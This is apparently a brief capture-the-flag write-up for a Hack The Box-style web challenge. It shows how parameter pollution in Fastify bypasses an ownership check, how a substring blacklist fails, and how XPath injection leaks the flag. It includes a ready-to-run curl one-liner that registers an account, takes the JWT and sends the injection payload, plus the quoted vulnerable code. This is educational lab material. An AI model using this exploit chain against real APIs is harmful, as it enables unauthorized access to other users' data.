
![](https://cdn-images-1.medium.com/max/1000/1*QqkOGGzVR3J3f7MBQ5td-Q.png)

#### Challenge Scenario

---

We migrated to a new stack, but somehow an attacker got access to our confidential data. Can you figure out how?

![](https://cdn-images-1.medium.com/max/1000/1*qIALHpsFzszQGrp2Dh2xJw.png)

so,i handle it to my helper

![](https://cdn-images-1.medium.com/max/1000/1*3VwhsPhsZhg8lEp537xQXA.png)

![](https://cdn-images-1.medium.com/max/1000/1*mdWLwa6cOlNqttPJuWwupA.png)

![](https://cdn-images-1.medium.com/max/1000/1*P3_nDNzDPQMZhTk_czjN7w.png)

![](https://cdn-images-1.medium.com/max/1000/1*sd_qdGCO9KUxYWVrLgQSIA.png)

and the final hit,if you want use it,remenber replace the ip target as yours

> **TOKEN=$(curl -s -X POST** [**http://154.57.164.72:32372/api/auth/register**](http://154.57.164.72:32372/api/auth/register) **\ -H ‘Content-Type: application/json’ \ -d ‘{“username”:”onecurl7",”email”:”onecurl7@trea.htb”,”password”:”Passw0rd!123"}’ \ | python3 -c “import sys,json;print(json.load(sys.stdin)[‘jwt’])”) && \ curl -s “http://154.57.164.72:32372/api/user?username=x%27%20or%20%27a%27%3D%27a&username=%27%20or%20%27a%27%3D%27a" \ -H “Authorization: Bearer $TOKEN”**

at the first line,we register a new account

than we use a simple sql to capture the flag

![](https://cdn-images-1.medium.com/max/1000/1*xW-vWPavgmn-x0KHvDlueg.png)

### **here is the full path**

1、the Fastify consider the ?username=A&username=B as { username: [‘A’,’B’] }

so it will bypass the 403

the biggest problem is **typeof username === ‘string’**

**_const { username } = req.query as any // 无 querystring schema  
if (typeof username === ‘string’ && username !== tokenPayload.username) → 403_**

2、the Array.prototype.includes doesn`t check substring matching

so “x’ or ‘a’=’a” won`t be blocked

**_const blacklist = [“‘“, ‘;’, ‘or’, ‘and’, ‘)’, “(“, “/”, “doc”]; return blacklist.some(p => input.includes(p));_**

3、the xpath sentence could be bypass by 

A = x’ or ‘a’=’a  
B = ‘ or ‘a’=’a

=>

//user[username=’x’ or ‘a’=’a,’ or ‘a’=’a’]

the ‘a’=’a’ was True

so it will return the flag

**_xpath.select1(`//user[username=’${username}’]`, doc)_**

4、routes/user.ts returns the flag